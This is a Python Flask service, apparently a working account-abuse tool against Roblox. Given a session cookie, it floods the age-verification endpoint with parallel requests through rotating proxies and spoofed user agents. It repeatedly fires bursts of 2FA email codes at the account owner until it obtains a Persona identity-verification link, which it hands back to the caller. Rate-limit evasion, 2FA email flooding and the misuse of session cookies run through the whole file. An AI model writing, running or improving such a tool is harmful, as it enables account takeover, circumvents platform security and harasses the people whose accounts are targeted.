# -*- coding: utf-8 -*-
"""
2FA Worker — бэкенд для Railway.
Исправлены: декодирование challenge meta, передача user_id в потоки, логирование email отправок.
"""
import os
import re
import json
import base64
import random
import logging
import time
import threading as _threading
import concurrent.futures as _futures
import requests as _requests
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

try:
    import socks  # noqa: F401 — требует requests[socks] в requirements.txt
except ImportError:
    logging.warning("socks не установлен — SOCKS-прокси работать не будут. Добавьте requests[socks] в requirements.txt")

app = Flask(__name__)

WORKER_SECRET = os.environ.get("WORKER_SECRET")
if not WORKER_SECRET:
    raise RuntimeError("WORKER_SECRET environment variable must be set")

_RAW_PROXIES = os.environ.get("PROXY_LIST", "")
_PROXY_POOL: list[str] = [p.strip() for p in _RAW_PROXIES.split(",") if p.strip()]
_proxy_idx = 0
_proxy_lock = _threading.Lock()

DEADLINE           = int(os.environ.get("DEADLINE", 300))
EMAIL_BURST_TARGET = int(os.environ.get("EMAIL_BURST_TARGET", 50))
BATCH_SIZE         = int(os.environ.get("BATCH_SIZE", 10))
PAUSE_BURST        = float(os.environ.get("PAUSE_BURST", 0.25))
PAUSE_POLL         = float(os.environ.get("PAUSE_POLL", 0.8))
PAUSE_429          = float(os.environ.get("PAUSE_429", 1.2))
RESEND_WAVE_SEC    = int(os.environ.get("RESEND_WAVE_SEC", 45))
MAX_TOTAL_REQUESTS = 150000

_URL_VERIFY = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
_URL_AUTH   = "https://users.roblox.com/v1/users/authenticated"
_BODY_VERIFY = {"generateLink": True, "ageEstimation": True, "parentVerification": False}

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

def _next_proxy() -> str | None:
    if not _PROXY_POOL:
        return None
    global _proxy_idx
    with _proxy_lock:
        idx = _proxy_idx % len(_PROXY_POOL)
        _proxy_idx += 1
    return _PROXY_POOL[idx]

def _proxy_dict(proxy_str: str | None) -> dict | None:
    if not proxy_str:
        return None
    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
        return {"http": proxy_str, "https": proxy_str}
    if not proxy_str.startswith("http"):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

def _base_headers(csrf: str | None = None) -> dict:
    h = {
        "User-Agent": random.choice(_USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/my/account#!/info",
    }
    if csrf:
        h["x-csrf-token"] = csrf
    return h

def extract_link_from_raw(body: str):
    if not body:
        return None
    m = re.search(r'https://[^\s"\'\\]+withpersona\.com[^\s"\'\\]*inquiry-id=[^\s"\'\\&]+(?:&[^\s"\'\\]*)?', body)
    if m:
        return m.group(0).rstrip("\\")
    m = re.search(r'inquiry-id=(inq_[A-Za-z0-9]+)', body)
    if m:
        inq_id = m.group(1)
        tok_m = re.search(r'session-token=([A-Za-z0-9_\-\.]+)', body)
        link = f"https://inquiry.withpersona.com/verify?inquiry-id={inq_id}"
        if tok_m:
            link += f"&session-token={tok_m.group(1)}"
        return link
    return None

def _decode_challenge_meta(challenge_meta_b64: str) -> dict:
    """Декодирует base64 challenge metadata из заголовка Roblox."""
    if not challenge_meta_b64:
        return {}
    try:
        # Roblox иногда шлёт URL-safe base64 или обычный — пробуем оба,
        # но не дублируем итерацию если строка не содержит - или _  (БАГ-19)
        converted = challenge_meta_b64.replace("-", "+").replace("_", "/")
        variants = [challenge_meta_b64]
        if converted != challenge_meta_b64:
            variants.append(converted)
        for b64 in variants:
            try:
                padded = b64 + "=" * (-len(b64) % 4)
                decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
                return json.loads(decoded)
            except Exception:
                continue
    except Exception as e:
        logging.warning("_decode_challenge_meta error: %s | raw=%s", e, challenge_meta_b64[:80])
    return {}

def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
    try:
        proxy = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers())
        if proxies:
            s.proxies.update(proxies)

        uid = None
        r_user = s.get(_URL_AUTH, timeout=10)
        if r_user.status_code == 200:
            uid = r_user.json().get("id")
            logging.info("Authenticated: user_id=%s", uid)
        else:
            logging.warning("Auth failed: status=%s", r_user.status_code)

        r_csrf = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
        csrf = r_csrf.headers.get("x-csrf-token")

        # Если аккаунт без 2FA — уже есть ссылка
        if r_csrf.status_code == 200:
            link = extract_link_from_raw(r_csrf.text)
            if link:
                return uid, "__LINK__:" + link

        # Если CSRF не получили с первого запроса — делаем повтор
        if csrf and r_csrf.status_code == 403 and not r_csrf.headers.get("rblx-challenge-type"):
            s.headers["x-csrf-token"] = csrf
            r2 = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
            csrf2 = r2.headers.get("x-csrf-token") or csrf
            if r2.status_code == 200:
                link = extract_link_from_raw(r2.text)
                if link:
                    return uid, "__LINK__:" + link
            csrf = csrf2

        logging.info("CSRF получен: %s, challenge_type: %s", bool(csrf), r_csrf.headers.get("rblx-challenge-type"))
        return uid, csrf
    except Exception as e:
        logging.error("_get_user_id_and_csrf error: %s", e)
        return None, None

def _trigger_2fa_email_send(
    cookie: str,
    user_id: int | None,
    csrf: str,
    challenge_id: str,
    challenge_meta_b64: str,
) -> bool:
    """
    Отправляет код на email через Roblox 2FA API.
    Создаёт новую сессию чтобы не конкурировать с потоками.
    """
    try:
        meta_json = _decode_challenge_meta(challenge_meta_b64)
        logging.debug("challenge meta decoded: %s", meta_json)

        # Пробуем все возможные ключи для challengeId
        inner_challenge_id = (
            meta_json.get("challengeId")
            or meta_json.get("twostepVerificationChallengeId")
            or meta_json.get("challenge_id")
            or challenge_id
        )

        action_type = meta_json.get("actionType") or meta_json.get("action_type") or "Generic"

        # user_id может прийти из meta если не передан
        uid = user_id or meta_json.get("userId") or meta_json.get("user_id")

        if not uid:
            logging.warning("_trigger_2fa_email_send: uid не найден (user_id=%s, meta=%s)", user_id, meta_json)
            return False

        if not inner_challenge_id:
            logging.warning("_trigger_2fa_email_send: challenge_id не найден (cid=%s, meta=%s)", challenge_id, meta_json)
            return False

        proxy = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        if proxies:
            s.proxies.update(proxies)

        send_url = f"https://twostepverification.roblox.com/v1/users/{uid}/challenges/email/send-code"
        payload = {"actionType": action_type, "challengeId": inner_challenge_id}
        s.headers.update(_base_headers(csrf))

        logging.info("Отправка email 2FA: uid=%s, challengeId=%s, actionType=%s", uid, inner_challenge_id, action_type)
        r_send = s.post(send_url, json=payload, timeout=8)
        success = r_send.status_code in (200, 204)
        logging.info("Email 2FA результат: status=%s, ok=%s, body=%s", r_send.status_code, success, r_send.text[:100])
        return success
    except Exception as e:
        logging.error("_trigger_2fa_email_send exception: %s", e)
        return False

def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: bool = True) -> dict:
    time.sleep(random.uniform(0.02, 0.22))
    try:
        proxy = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers(csrf))
        if proxies:
            s.proxies.update(proxies)

        r = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
        new_csrf = r.headers.get("x-csrf-token")

        # CSRF обновился — повторяем без challenge (plain 403)
        if r.status_code == 403 and new_csrf and not r.headers.get("rblx-challenge-type"):
            csrf = new_csrf
            s.headers["x-csrf-token"] = csrf
            r = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
            new_csrf = r.headers.get("x-csrf-token") or csrf

        link = None
        if r.status_code == 200:
            link = extract_link_from_raw(r.text)

        ctype = r.headers.get("rblx-challenge-type", "")
        cid   = r.headers.get("rblx-challenge-id", "")
        cmeta = r.headers.get("rblx-challenge-metadata", "")

        # При 403+challenge Roblox всегда возвращает свежий CSRF — берём его
        effective_csrf = new_csrf or csrf

        email_sent = False
        if r.status_code == 403 and ctype and trigger_email and cid:
            # Передаём cookie отдельно чтобы _trigger мог создать свою сессию
            email_sent = _trigger_2fa_email_send(cookie, user_id, effective_csrf, cid, cmeta)

        return {
            "status": r.status_code,
            "link": link,
            "challengeType": ctype,
            "challengeId": cid,
            "challengeMeta": cmeta,
            "emailSent": email_sent,
            "newCsrf": effective_csrf,
            "body": r.text[:200],
        }
    except Exception as e:
        logging.error("_one_request exception: %s", e)
        return {"status": 0, "link": None, "body": str(e), "challengeType": "", "emailSent": False, "newCsrf": None}

def run_parallel_api_for_duration(
    cookie: str,
    workers: int = BATCH_SIZE,
    target_emails: int = EMAIL_BURST_TARGET,
    duration_sec: float = DEADLINE,
) -> str | None:
    start = time.time()
    last_wave_reset = start
    total = 0
    challenges_in_wave = 0
    emails_sent_total = 0

    user_id, csrf = _get_user_id_and_csrf(cookie)
    if csrf and csrf.startswith("__LINK__:"):
        logging.info("Ссылка получена без 2FA сразу")
        return csrf[9:]

    if not csrf:
        for attempt in range(3):
            time.sleep(0.5)
            user_id, csrf = _get_user_id_and_csrf(cookie)
            if csrf:
                break
            logging.warning("CSRF retry %d/3 — неудача", attempt + 1)

    if not csrf:
        logging.error("КРИТИЧЕСКАЯ ОШИБКА: Не удалось получить CSRF токен! Проверьте cookie и сеть.")
        return None

    logging.info(
        "Воркер запущен: user_id=%s, csrf=%s…, workers=%d, target_emails=%d, deadline=%ds",
        user_id, csrf[:8] if csrf else "None", workers, target_emails, int(duration_sec),
    )

    found_link = None
    # БАГ-16: не используем with-блок — он ждёт все потоки при выходе (shutdown wait=True).
    # Создаём executor вручную и вызываем shutdown(wait=False, cancel_futures=True) при раннем выходе.
    ex = _futures.ThreadPoolExecutor(max_workers=workers)
    try:
        while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
            now = time.time()

            # Сбрасываем счётчик волны — отправляем email снова
            if challenges_in_wave >= target_emails and (now - last_wave_reset) >= RESEND_WAVE_SEC:
                logging.info("Новая волна email: сброс счётчика (было %d)", challenges_in_wave)
                challenges_in_wave = 0
                last_wave_reset = now

            need_more_emails = challenges_in_wave < target_emails
            futs = [
                ex.submit(_one_request, cookie, csrf, user_id, need_more_emails)
                for _ in range(workers)
            ]
            results = [f.result() for f in _futures.as_completed(futs)]
            total += len(results)

            # БАГ-C: обрабатываем всю статистику батча ДО break,
            # иначе challenges_in_wave и emails_sent_total занижены при found_link
            for r in results:
                if r.get("link") and not found_link:
                    logging.info("УСПЕХ! Ссылка получена после %d запросов: %s", total, r["link"])
                    found_link = r["link"]
                if r.get("status") == 403 and r.get("challengeType"):
                    challenges_in_wave += 1
                if r.get("emailSent"):
                    emails_sent_total += 1

            if found_link:
                break

            # БАГ-17: обновляем CSRF один раз — сначала из ответов батча,
            # только если там нет — делаем сетевой запрос.
            fresh_csrf = next((r["newCsrf"] for r in results if r.get("newCsrf")), None)
            if fresh_csrf:
                csrf = fresh_csrf

            has_challenge = any(r.get("challengeType") for r in results if r["status"] == 403)
            has_plain_403 = any(not r.get("challengeType") for r in results if r["status"] == 403)
            has_429       = any(r["status"] == 429 for r in results)

            # Логируем статусы каждую волну
            statuses = [r["status"] for r in results]
            logging.info(
                "Батч: total=%d, statuses=%s, challenges_wave=%d, emails_total=%d",
                total, {s: statuses.count(s) for s in set(statuses)}, challenges_in_wave, emails_sent_total,
            )

            if has_plain_403 and not has_challenge:
                logging.warning("plain 403 без challenge — CSRF мог протухнуть, обновляем")
                if fresh_csrf:
                    logging.info("CSRF обновлён из ответа батча: %s…", csrf[:8])
                else:
                    # Свежего CSRF в батче не было — перезапрашиваем напрямую
                    _, new_tok = _get_user_id_and_csrf(cookie)
                    if new_tok and not new_tok.startswith("__LINK__:"):
                        csrf = new_tok
                        logging.info("CSRF перезапрошен: %s…", csrf[:8])

            if challenges_in_wave < target_emails:
                time.sleep(PAUSE_429 if has_429 else PAUSE_BURST)
            else:
                time.sleep(PAUSE_429 if has_429 else PAUSE_POLL)

    finally:
        # cancel_futures=True (Python 3.9+) — не ждём незапущенные задачи
        ex.shutdown(wait=False, cancel_futures=True)

    if found_link:
        return found_link

    logging.error("Время вышло: %ds, всего запросов: %d, email отправлено: %d", int(duration_sec), total, emails_sent_total)
    return None

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "file": "worker.py", "deadline_sec": DEADLINE})

# БАГ-18: ограничиваем параллельные /get-link чтобы не исчерпать потоки Flask
_MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT_REQUESTS", 3))
_request_sem = _threading.Semaphore(_MAX_CONCURRENT)

@app.route("/get-link", methods=["POST"])
def get_link():
    secret = request.headers.get("X-Secret") or (request.json or {}).get("secret", "")
    if secret != WORKER_SECRET:
        return jsonify({"error": "unauthorized"}), 401
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    method = data.get("method", "camera").strip()
    if not cookie:
        return jsonify({"error": "cookie required"}), 400

    if not _request_sem.acquire(blocking=False):
        return jsonify({"error": "worker busy, try another worker"}), 503

    try:
        link = run_parallel_api_for_duration(
            cookie,
            workers=BATCH_SIZE,
            target_emails=EMAIL_BURST_TARGET,
            duration_sec=DEADLINE,
        )
    finally:
        _request_sem.release()

    if link:
        return jsonify({"link": link})
    return jsonify({"error": "failed to get link within deadline"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
